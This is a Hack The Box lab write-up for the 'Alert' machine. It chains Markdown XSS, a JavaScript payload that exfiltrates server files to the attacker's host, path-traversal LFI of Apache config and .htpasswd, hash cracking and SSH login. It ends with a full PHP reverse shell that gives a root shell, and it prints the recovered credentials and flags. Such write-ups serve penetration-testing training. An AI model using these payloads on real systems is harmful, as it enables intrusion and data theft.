
# HTB - Alert

## Machine Information

| Information      | Details                                            |
| ---------------- | -------------------------------------------------- |
| Machine          | Alert                                              |
| IP Address       | `10.129.231.188`                                   |
| Operating System | Linux                                              |
| Difficulty       | Easy                                               |
| Main Services    | SSH, HTTP                                          |
| Attack Vector    | XSS, LFI, Hash Cracking, SSH, Privilege Escalation |

# 1. Reconnaissance

The target machine was assigned the IP address:

```text
10.129.231.188
```

As usual, I started with a full TCP port scan while opening Firefox with the Hack The Box VPN enabled.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.129.231.188 -oG Allports
```

The scan revealed two open ports:

```text
22/tcp   SSH
80/tcp   HTTP
```

Port 22 was running SSH, while port 80 hosted a web application.

When accessing the IP address directly through the browser, the server automatically redirected me to:

```text
alert.htb
```

Therefore, I added the hostname to `/etc/hosts`:

```text
10.129.231.188 alert.htb
```

After doing this, I could access the application correctly through:

```text
http://alert.htb
```

# 2. Web Enumeration

The main application allows users to upload Markdown files and preview them.

Since the application processes user-controlled Markdown, I first tested whether a Local File Inclusion vulnerability was available by attempting to manipulate the URL and access local files.

The initial LFI attempts did not provide any useful results.

I then moved to another possible attack vector: Cross-Site Scripting.

I created a simple Markdown payload containing JavaScript:

```html
<script>alert('XSS')</script>
```

I uploaded the Markdown file and opened it.

The JavaScript executed successfully, confirming that the application was vulnerable to XSS through Markdown processing.

At this point, I had an XSS primitive that could potentially be used to perform actions from another user's browser.

# 3. Virtual Host and Directory Enumeration

While testing the application, I also started enumerating virtual hosts and directories.

For virtual hosts:

```bash
gobuster vhost -u http://alert.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100 --append-domain -r
```

For directories:

```bash
gobuster dir -u 10.129.231.188 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100
```

The application also contained a sharing functionality. When sharing a Markdown document, the application generated a link that could be opened by another user.

This was particularly interesting because the website's `About Us` section indicated that an administrator could contact users to help resolve issues.

Therefore, I went to the `Contact Us` functionality.

# 4. Confirming That the Administrator Opens Links

I submitted another XSS payload through the contact functionality.

However, I could not directly see the JavaScript execution.

Instead of assuming that the XSS did not work, I tested whether the administrator would actually open external links.

I created a simple Python HTTP server:

```bash
python3 -m http.server 80
```

Then I submitted a link containing a parameter such as:

```text
http://10.10.15.194/?test
```

When the administrator processed the submitted content, my server received a connection.

This confirmed that the administrator was opening externally supplied URLs.

This was important because the XSS could now potentially be used to make authenticated requests from the administrator's browser and exfiltrate their responses.

# 5. Discovering the Statistics Subdomain

The virtual host enumeration eventually revealed an interesting subdomain:

```text
statistics.alert.htb
```

I added it to `/etc/hosts`:

```text
10.129.231.188 alert.htb statistics.alert.htb
```

The directory enumeration also revealed several interesting resources:

```text
contact.php
.php
index.php
uploads
css
messages
messages.php
```

The `statistics.alert.htb` subdomain contained an authentication panel with a username and password.

I tested several common default credential combinations, such as:

```text
admin:admin
root:admin
admin:root
root:root
```

None of them worked.

At this point, I returned to the XSS vector.

# 6. Using XSS to Discover LFI

The application contained:

```text
messages.php
```

which accepted a `file` parameter.

This suggested that the application might be reading arbitrary files from the server.

Because the administrator was opening the shared content, I created a Markdown file containing a JavaScript file loaded from my machine:

```html
<script src="http://10.10.15.194/pwn.js"></script>
```

My `pwn.js` file contained:

```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../../etc/hosts', false);
req.send();

var exfil = new XMLHttpRequest();
exfil.open('GET', 'http://10.10.15.194/?b64=' + btoa(req.responseText, false));
exfil.send();
```

The script performs two important actions.

First, it requests:

```text
http://alert.htb/messages.php?file=../../../../../../../../../etc/hosts
```

This attempts to exploit path traversal through the `file` parameter.

Second, it takes the response and Base64-encodes it:

```javascript
btoa(req.responseText, false)
```

The encoded data is then sent back to my HTTP server.

I uploaded the Markdown file while hosting `pwn.js` from my machine.

My server received the request, confirming that the JavaScript was executed by the administrator's browser.

More importantly, the response from the LFI was successfully exfiltrated.

This confirmed the complete chain:

```text
XSS -> Administrator's Browser -> LFI -> File Read -> Data Exfiltration
```

# 7. Reading the Apache Configuration

Since I had confirmed that arbitrary local files could be read through the administrator's browser, I started looking for useful configuration files.

One of the first places to investigate was Apache's configuration directory:

```text
/etc/apache2
```

I modified the JavaScript payload to request:

```text
/etc/apache2/sites-available/000-default.conf
```

The payload became:

```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../../etc/apache2/sites-available/000-default.conf', false);
req.send();

var exfil = new XMLHttpRequest();
exfil.open('GET', 'http://10.10.15.194/?b64=' + btoa(req.responseText, false));
exfil.send();
```

The administrator opened the Markdown file, and my server received the Base64-encoded response.

I decoded it with:

```bash
echo PHByZT48VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgYWxlcnQuaHRiCgogICAgRG9jdW1lbnRSb290IC92YXIvd3d3L2FsZXJ0Lmh0YgoKICAgIDxEaXJlY3RvcnkgL3Zhci93d3cvYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEJsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICBSZXdyaXRlRW5naW5lIE9uCiAgICBSZXdyaXRlQ29uZCAle0hUVFBfSE9TVH0gIV5hbGVydFwuaHRiJAogICAgUmV3cml0ZUNvbmQgJXtIVFRQX0hPU1R9ICFeJAogICAgUmV3cml0ZVJ1bGUgXi8/KC4qKSQgaHR0cDovL2FsZXJ0Lmh0Yi8kMSBbUj0zMDEsTF0KCiAgICBFcnJvckxvZyAke0FQQUNIRV9MT0dfRElSfS9lcnJvci5sb2cKICAgIEN1c3RvbUxvZyAke0FQQUNIRV9MT0dfRElSfS9hY2Nlc3MubG9nIGNvbWJpbmVkCjwvVmlydHVhbEhvc3Q+Cgo8VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgc3RhdGljcy5hbGVydC5odGIKICAgIERvY3VtZW50Um9vdCAvdmFyL3d3dy9zdGF0aXN0aWNzLmFsZXJ0Lmh0YgoKICAgIDxEaXJlY3RvcnkgL3Zhci93d3cvc3RhdGljcy5hbGVydC5odGI+CiAgICAgICAgT3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzCiAgICAgICAgQWxsb3dPdmVy cmlkZSBBbGwKICAgIDwvRGlyZWN0b3J5PgoKICAgIDxEaXJlY3RvcnkgL3Zhci93d3cvc3RhdGljcy5hbGVydC5odGI+CiAgICAgICAgT3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzIE11bHRpVmlld3MKICAgICAgICBBbGxvd092ZXJyaWRlIEFsbAogICAgICAgIEF1dGhUeXBlIEJhc2ljCiAgICAgICAgQXV0aE5hbWUgIlJlc3RyaWN0ZWQgQXJlYSIKICAgICAgICBBdXRoVXNlckZpbGUgL3Zhci93d3cvc3RhdGljcy5hbGVydC5odGIvLmh0cGFzc3dkCiAgICAgICAgUmVxdWlyZSB2YWxpZC11c2VyCiAgICA8L0RpcmVjdG9yeT4KCiAgICBFcnJvckxvZyAke0FQQUNIRV9MT0dfRElSfS9lcnJvci5sb2cKICAgIEN1c3RvbUxvZyAke0FQQUNIRV9MT0dfRElSfS9hY2Nlc3MubG9nIGNvbWJpbmVkCjwvVmlydHVhbEhvc3Q+Cgo8L3ByZT4K | base64 -d
```

The relevant configuration revealed:

```apache
<VirtualHost *:80>
    ServerName alert.htb

    DocumentRoot /var/www/alert.htb

    <Directory /var/www/alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^alert\.htb$
    RewriteCond %{HTTP_HOST} !^$
    RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:80>
    ServerName statistics.alert.htb

    DocumentRoot /var/www/statistics.alert.htb

    <Directory /var/www/statistics.alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    <Directory /var/www/statistics.alert.htb>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
        Require valid-user
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

This was particularly useful because the configuration explicitly disclosed the location of the Apache Basic Authentication password file:

```text
/var/www/statistics.alert.htb/.htpasswd
```

This is something that would have been considerably harder to discover through simple directory enumeration because `.htpasswd` is a hidden file and is not necessarily exposed through normal web paths.

# 8. Extracting the .htpasswd File

I modified the JavaScript again to request the discovered `.htpasswd` file:

```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../../var/www/statistics.alert.htb/.htpasswd', false);
req.send();

var exfil = new XMLHttpRequest();
exfil.open('GET', 'http://10.10.15.194/?b64=' + btoa(req.responseText, false));
exfil.send();
```

The server received the encoded response.

After decoding it:

```bash
echo PHByZT5hbGJlcnQ6JGFwcjEkYk1vUkJKT2ckaWdHOFdCdFExeFlEVFFkTGpTV1pRLwo8L3ByZT4K | base64 -d
```

I obtained:

```text
<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</pre>
```

The important information was:

```text
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

This gave me both a username and a password hash.

# 9. Cracking the Password Hash

The `$apr1$` prefix indicates an Apache MD5-based password hash, commonly referred to as MD5(APR1).

I verified the hash type with:

```bash
hash-identifier '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/'
```

The output included:

```text
--------------------------------------------------
 HASH: $apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/

Possible Hashs:
[+] MD5(APR)
--------------------------------------------------
 HASH:
```

I then created a file named `hash` containing the username and hash:

```text
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

I used Hashcat with the `rockyou.txt` wordlist:

```bash
hashcat hash /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt --user
```

The `--user` option tells Hashcat that the input contains a username before the hash.

Hashcat successfully cracked the password:

```text
manchesterunited
```

The recovered credential was:

```text
albert:manchesterunited
```

# 10. SSH Access

The credentials did not work on the web login panel, so I tried them against the SSH service identified during the initial Nmap scan.

```bash
ssh albert@10.129.231.188
```

I entered:

```text
Password: manchesterunited
```

The credentials worked, giving me a shell as `albert`.

I then looked for the user flag and found:

```text
99977d9db3f96fafa3d8a4f111e3d9b6
```

# 11. Privilege Escalation Enumeration

I first checked whether `albert` had any sudo permissions:

```bash
sudo -l
```

There were no useful sudo permissions.

I then checked the user's groups:

```bash
id
```

The output was:

```text
albert@alert:~$ id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
```

The important part was:

```text
groups=1000(albert),1001(management)
```

The user belonged to the `management` group.

I searched the filesystem for files and directories associated with this group:

```bash
find / -group management 2>/dev/null
```

This revealed interesting locations, including:

```text
/web-site/monitors
```

I navigated there and checked the permissions:

```bash
cd /web-site/monitors
ls -l
```

The directory was writable by the `management` group while being associated with the web service running with elevated privileges.

This provided the privilege escalation vector.

# 12. Exploiting the Writable Web Directory

The key idea was that I could place a PHP file inside the writable `monitors` directory.

However, the service was only accessible through localhost, so I needed to forward the remote machine's localhost port to my machine.

I exited the existing SSH session and created an SSH local port forward:

```bash
ssh albert@10.129.231.188 -L 8080:127.0.0.1:8080
```

This mapped my local port `8080` to:

```text
127.0.0.1:8080
```

on the target machine.

I could then access the service locally through:

```text
http://localhost:8080
```

The important detail was that the web service processing the files was running with root privileges.

Therefore, if I could make it execute a PHP reverse shell from the writable directory, the resulting shell would inherit the privileges of the web service.

# 13. Creating the Malicious PHP File

I created a PHP reverse shell named:

```text
test.php
```

The reverse shell used the following structure:

```php
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.15.192';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();

    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }

    if ($pid) {
        exit(0);
    }

    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise. This is quite common and not fatal.");
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);

if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    global $daemon;

    if (!$daemon) {
        print "$string\n";
    }
}

?>
```

The IP address in the reverse shell must be the IP of my attacking machine reachable from the target. In my notes, the IP appears as `10.10.15.192` here, while earlier payloads used `10.10.15.194`, so the value must match the current HTB VPN interface address when reproducing the exploit.

I placed `test.php` inside the writable directory:

```text
/web-site/monitors/test.php
```

# 14. Getting the Root Shell

I started a Netcat listener on the configured port:

```bash
nc -lvnp 4444
```

Then I accessed the PHP file through the forwarded service:

```text
http://localhost:8080/monitors/test.php
```

The server executed the PHP code.

Because the web service was running with root privileges, the reverse shell was created as root.

I verified the privileges with:

```bash
whoami
```

The result was:

```text
root
```

The final step was simply to read the root flag:

```bash
cat /root/root.txt
```

The root flag was:

```text
49afe0a711b9b75358c68b0680e33898
```

# Attack Path

```text
Port Enumeration
    |
    v
alert.htb
    |
    v
Markdown Upload
    |
    v
XSS via Markdown
    |
    v
Administrator Opens Shared Link
    |
    v
XSS Executes in Administrator Context
    |
    v
messages.php File Parameter
    |
    v
LFI / Path Traversal
    |
    v
Read /etc/apache2/sites-available/000-default.conf
    |
    v
Discover statistics.alert.htb
    |
    v
Discover .htpasswd Location
    |
    v
Read .htpasswd through LFI
    |
    v
Albert MD5(APR1) Hash
    |
    v
Hashcat
    |
    v
albert:manchesterunited
    |
    v
SSH
    |
    v
management Group
    |
    v
Writable /web-site/monitors
    |
    v
SSH Local Port Forward
    |
    v
Malicious PHP File
    |
    v
Root Web Service Executes PHP
    |
    v
Root Reverse Shell
```

# Vulnerabilities & Techniques

## Cross-Site Scripting

The Markdown functionality allowed JavaScript to be executed through user-controlled content.

```html
<script>alert('XSS')</script>
```

This became especially useful because the administrator opened submitted links.

## Stored/Triggered XSS Through Markdown

The JavaScript payload could be hosted externally and loaded when the administrator opened the Markdown document:

```html
<script src="http://10.10.15.194/pwn.js"></script>
```

This allowed the attacker's JavaScript to execute within the administrator's browser context.

## Local File Inclusion

The `messages.php` endpoint accepted a `file` parameter that could be manipulated with path traversal:

```text
messages.php?file=../../../../../../../../../etc/hosts
```

The combination of XSS and LFI allowed the attacker to make the administrator's browser request files from the server.

## Data Exfiltration

The JavaScript encoded the retrieved response using Base64:

```javascript
btoa(req.responseText, false)
```

and sent the result to the attacker's HTTP server.

This made it possible to retrieve sensitive files without directly accessing the vulnerable endpoint from the attacker machine.

## Apache Configuration Disclosure

Reading:

```text
/etc/apache2/sites-available/000-default.conf
```

revealed the existence of:

```text
statistics.alert.htb
```

and the location of:

```text
/var/www/statistics.alert.htb/.htpasswd
```

## Password Hash Disclosure

The `.htpasswd` file contained:

```text
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

The `$apr1$` format corresponds to Apache's MD5-based password hashing scheme.

## Password Cracking

Hashcat was used with the `rockyou.txt` wordlist:

```bash
hashcat hash /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt --user
```

The password was recovered as:

```text
manchesterunited
```

## Credential Reuse

The recovered password was reused for the `albert` system account, allowing SSH access.

## Insecure Group Permissions

The `albert` account belonged to:

```text
management
```

The group had access to a directory used by a web service:

```text
/web-site/monitors
```

This provided a path to place executable PHP code.

## Privilege Escalation Through a Root Web Service

The web service responsible for processing the writable directory was running with root privileges.

By placing a malicious PHP file in the directory and accessing it through the service, the PHP code executed with the privileges of the service.

This resulted in a root reverse shell.

# Lessons Learned

The most important part of this machine was understanding how several relatively small vulnerabilities could be chained together.

The Markdown XSS by itself was not enough to immediately obtain a shell. Its real value came from the fact that an administrator was opening user-controlled links.

That allowed the attack to move from:

```text
XSS
```

to:

```text
XSS -> LFI -> Sensitive File Disclosure
```

The Apache configuration then provided information that was difficult to obtain through normal enumeration, including the exact location of `.htpasswd`.

After cracking the Apache password hash, credential reuse provided SSH access as `albert`.

For privilege escalation, `sudo -l` did not provide anything useful. Instead, checking group membership with:

```bash
id
```

revealed the `management` group.

Searching for resources associated with that group using:

```bash
find / -group management 2>/dev/null
```

led to the writable web directory.

The final escalation demonstrates why file permissions and the privileges of services are important during Linux enumeration. A writable directory becomes significantly more dangerous when a privileged service executes files placed there.

The complete chain was:

```text
XSS
LFI
Sensitive Information Disclosure
Hash Cracking
Credential Reuse
SSH Access
Group Enumeration
Writable Web Directory
PHP Code Execution
Privilege Escalation
Root
```

pwned :)))))
